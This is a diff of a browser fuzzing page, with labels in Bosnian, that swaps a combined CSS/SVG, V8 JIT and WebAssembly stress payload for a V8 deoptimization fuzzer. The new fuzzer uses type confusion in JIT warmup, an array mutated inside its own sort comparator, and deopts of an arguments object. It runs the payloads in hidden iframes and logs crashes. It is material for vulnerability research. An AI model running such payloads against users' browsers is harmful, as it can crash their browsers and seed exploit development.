@@ -2,20 +2,20 @@
 <html lang="bs">
 <head>
     <meta charset="utf-8">
-    <title>Triple Threat Fuzzer</title>
+    <title>V8 Deopt Fuzzer</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        h1 { color: #f00; text-shadow: 0 0 10px #f00; }
-        #status { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #ff0; }
-        #logs { background: #111; border: 1px solid #f00; height: 65vh; overflow-y: auto; padding: 10px; font-size: 14px; }
+        h1 { color: #ff0; text-shadow: 0 0 10px #ff0; }
+        #status { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #fff; }
+        #logs { background: #111; border: 1px solid #0f0; height: 65vh; overflow-y: auto; padding: 10px; font-size: 14px; }
         .crash { color: #fff; background: #f00; font-weight: bold; padding: 5px; }
-        button { background: #f00; color: #fff; border: 2px solid #fff; padding: 15px 25px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
-        button:hover { background: #fff; color: #f00; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 25px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
+        button:hover { background: #fff; }
     </style>
 </head>
 <body>
-    <h1>TRIPLE THREAT FUZZER</h1>
-    <button onclick="startFuzz()">POKRENI TROJNI NAPAD</button>
+    <h1>V8 DEOPT MUTATION FUZZER</h1>
+    <button onclick="startFuzz()">POKRENI DEOPT NAPAD</button>
     <div id="status">Status: Čeka...</div>
     <div id="logs"></div>
 
@@ -23,7 +23,7 @@
         const logEl = document.getElementById('logs');
         const statusEl = document.getElementById('status');
         let isRunning = false;
-        let testId = parseInt(localStorage.getItem('triple_id') || '0');
+        let testId = parseInt(localStorage.getItem('deopt_id') || '0');
 
         function log(msg, isCrash = false) {
             const div = document.createElement('div');
@@ -32,87 +32,81 @@
             logEl.prepend(div);
         }
 
-        const crashedId = localStorage.getItem('triple_crash');
+        const crashedId = localStorage.getItem('deopt_crash');
         if (crashedId) {
-            log(`!!! TROJNI CRASH NA TESTU ID: ${crashedId} !!!`, true);
-            log(`Konzola je legla na sva tri fronta! Ovo je zlato!`, true);
-            localStorage.removeItem('triple_crash');
+            log(`!!! DEOPT CRASH NA TESTU ID: ${crashedId} !!!`, true);
+            log(`Ovo je pravi JIT bug! Memorija je pukla od deoptimizacije!`, true);
+            localStorage.removeItem('deopt_crash');
         } else {
-            log(`Trojni fuzzer spreman. ID: ${testId}`);
+            log(`Deopt fuzzer spreman. ID: ${testId}`);
         }
 
-        function getTriplePayload() {
+        function generateDeoptPayload() {
             let rand = Math.random();
+            let arraySize = Math.floor(rand * 500) + 10;
             
-            let cssAttack = `
-                <style>
-                    .jebac { 
-                        transform: rotate(${rand * 360}deg) scale(${rand * 10});
-                        clip-path: polygon(0 0, 100% 0, 50% 100%);
-                        mask: url(#m1);
-                        filter: blur(${rand * 10}px);
-                    }
-                </style>
-                <svg>
-                    <foreignObject width="100%" height="100%">
-                        <math>
-                            <mtext>
-                                <table>
-                                    <tr>
-                                        <td class="jebac">
-                                            <div style="width:${rand*10000}px; height:${rand*10000}px;">X</div>
-                                        </td>
-                                    </tr>
-                                </table>
-                            </mtext>
-                        </math>
-                    </foreignObject>
-                </svg>
-            `;
-
-            let jsAttack = `
+            return `
                 try {
-                    // 1. V8 JIT Type Confusion
-                    function target(x) { return x.val || x; }
-                    for (let i = 0; i < 10000; i++) target(1.1); 
-                    for (let j = 0; j < 500; j++) {
-                        target({val: "str"}); 
-                        target(new Proxy({}, {get: function(){ return 1; }})); 
+                    // 1. JIT Warmup - V8 misli da je uvijek isti tip
+                    function shapeShift(x) {
+                        return x.a;
                     }
                     
-                    // 2. WASM / ArrayBuffer OOB
-                    let buf = new ArrayBuffer(${Math.floor(rand * 10000)});
-                    let view = new DataView(buf);
-                    for(let k=0; k<100; k++) { view.setUint32(k * 1024, 0x41414141); }
-                    
-                    if (typeof WebAssembly !== 'undefined') {
-                        let bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,10,9,1,7,0,65,0,65,0,54,2,0,11]);
-                        for(let w=0; w<10; w++) new WebAssembly.Instance(new WebAssembly.Module(bytes));
+                    let obj = {a: 1.1};
+                    for(let i = 0; i < 50000; i++) {
+                        shapeShift(obj);
                     }
+                    
+                    // 2. Trigger Deoptimization (Type Confusion)
+                    for(let j = 0; j < 1000; j++) {
+                        shapeShift({a: "string"});
+                        shapeShift({a: {}});
+                        shapeShift({b: 1}); // Undefined
+                    }
+
+                    // 3. Array Sort Mutation (V8 istorijski bug)
+                    let arr = [];
+                    for(let k = 0; k < ${arraySize}; k++) arr.push(k);
+                    
+                    arr.sort(function(a, b) {
+                        // Mijenjamo niz DOK se sortira - garantovani haos
+                        if (a % 10 === 0) { 
+                            arr.push("A".repeat(100)); 
+                            arr.length = arr.length / 2; 
+                        }
+                        return a - b;
+                    });
+
+                    // 4. Arguments Object Deopt
+                    function withArgs() {
+                        return arguments[0] + arguments[1];
+                    }
+                    for(let m = 0; m < 10000; m++) withArgs(1, 2);
+                    withArgs("a", "b"); // Deopt
+                    withArgs({}, []);   // Deopt
+
                 } catch(e) {}
             `;
-
-            return { css: cssAttack, js: jsAttack };
         }
 
         function startFuzz() {
             if (isRunning) return;
             isRunning = true;
-            statusEl.textContent = "Status: TROJNI NAPAD U TOKU...";
-            log("Kreće kombinovani V8 + Blink + WASM napad...");
+            statusEl.textContent = "Status: DEOPT NAPAD U TOKU...";
+            log("Kreće gađanje JIT kompajlera i Array mutacija...");
 
             function loop() {
                 if (!isRunning) return;
                 
                 testId++;
-                localStorage.setItem('triple_id', testId);
-                localStorage.setItem('triple_crash', testId);
+                localStorage.setItem('deopt_id', testId);
+                localStorage.setItem('deopt_crash', testId);
 
                 if (testId % 5 === 0) {
-                    log(`Test ID: ${testId} - Trojni udar...`);
+                    log(`Test ID: ${testId} - Deopt u toku...`);
                 }
 
-                let payload = getTriplePayload();
+                let js = generateDeoptPayload();
                 
                 let iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
@@ -121,27 +115,27 @@
                 try {
                     let doc = iframe.contentWindow.document;
                     doc.open();
-                    doc.write("<!doctype html><html><head>" + payload.css + "</head><body></body></html>");
+                    doc.write("<!doctype html><html><body></body></html>");
                     doc.close();
                     
                     let script = doc.createElement('script');
-                    script.textContent = payload.js;
+                    script.textContent = js;
                     doc.body.appendChild(script);
                 } catch(e) {}
 
                 setTimeout(() => {
-                    if (localStorage.getItem('triple_crash') == testId) {
-                        localStorage.removeItem('triple_crash');
+                    if (localStorage.getItem('deopt_crash') == testId) {
+                        localStorage.removeItem('deopt_crash');
                     }
                     if (iframe.parentNode) {
                         document.body.removeChild(iframe);
                     }
                     loop();
-                }, 150); 
+                }, 100); 
             }
 
             loop();
         }
     </script>
 </body>
-  </html>
+</html>
